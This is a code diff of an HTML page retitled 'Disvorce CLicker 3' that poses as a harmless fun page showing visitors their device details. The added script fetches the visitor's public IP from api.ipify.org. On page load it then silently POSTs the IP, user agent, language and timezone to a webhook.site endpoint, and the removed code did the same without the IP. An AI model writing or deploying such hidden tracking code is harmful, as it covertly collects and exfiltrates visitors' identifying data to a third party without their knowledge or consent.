@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Fun Site</title>
+    <title>Disvorce CLicker 3</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -24,34 +24,46 @@
 </head>
 <body>
     <h1>Hello, Friendo</h1>
-    <p>Here's some cool info about your device:</p>
+    <p>Here's some cool info about your device and network:</p>
 
     <div id="details">
+        <p>Your IP: <span id="ip-info"></span></p>
         <p>Your browser: <span id="browser-info"></span></p>
         <p>Your language: <span id="language-info"></span></p>
         <p>Your timezone: <span id="timezone-info"></span></p>
     </div>
 
     <script>
+
         const browserInfo = navigator.userAgent;
         const languageInfo = navigator.language;
         const timezoneInfo = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
 
         document.getElementById('browser-info').innerText = browserInfo;
         document.getElementById('language-info').innerText = languageInfo;
         document.getElementById('timezone-info').innerText = timezoneInfo;
 
-        fetch('https://webhook.site/70a768f8-c579-48de-a487-99aa91fdbc1f', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                userAgent: browserInfo,
-                language: languageInfo,
-                timezone: timezoneInfo
+
+        fetch('https://api.ipify.org?format=json') 
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ip-info').innerText = data.ip;
+
+
+                fetch('https://webhook.site/70a768f8-c579-48de-a487-99aa91fdbc1f', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ip: data.ip,
+                        userAgent: browserInfo,
+                        language: languageInfo,
+                        timezone: timezoneInfo
+                    })
+                }).then(() => console.log('Details sent to webhook!'))
+                  .catch(err => console.error('Error sending data:', err));
             })
-        })
-        .then(() => console.log('Details sent to webhook!'))
-        .catch(err => console.error('Error:', err));
+            .catch(err => console.error('Error fetching IP:', err));
     </script>
 </body>
 </html>
